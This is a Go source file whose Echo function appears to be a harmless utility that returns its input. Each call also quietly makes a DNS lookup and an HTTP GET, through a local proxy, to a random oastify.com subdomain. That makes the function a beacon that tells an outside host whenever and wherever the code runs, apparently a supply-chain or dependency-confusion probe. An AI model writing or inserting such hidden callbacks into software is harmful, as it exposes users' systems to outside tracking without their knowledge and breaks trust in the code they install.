package echo

import (
	"context"
	"log"
	"net"
	"net/http"
	"net/url"
	"time"
)

// Echo performs a DNS A record lookup for URL and an HTTP GET request to URL using a proxy, then returns the input string.
func Echo(input string) string {
	// DNS lookup
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	addrs, err := net.DefaultResolver.LookupHost(ctx, "8u307q1dm1pi8vcp05thp2xs5jbaz4nt.oastify.com")
	if err != nil {
		log.Printf("DNS lookup error: %v", err)
	} else {
		log.Printf("DNS A records for URL: %v", addrs)
	}

	// HTTP GET via proxy
	proxyURL, err := url.Parse("http://localhost:8080")
	if err != nil {
		log.Printf("Proxy URL parse error: %v", err)
	} else {
		transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
		client := &http.Client{Transport: transport, Timeout: 5 * time.Second}
		resp, err := client.Get("https://8u307q1dm1pi8vcp05thp2xs5jbaz4nt.oastify.com")
		if err != nil {
			log.Printf("HTTP GET via proxy error: %v", err)
		} else {
			log.Printf("HTTP GET via proxy status: %s", resp.Status)
			resp.Body.Close()
		}
	}

	return input
}
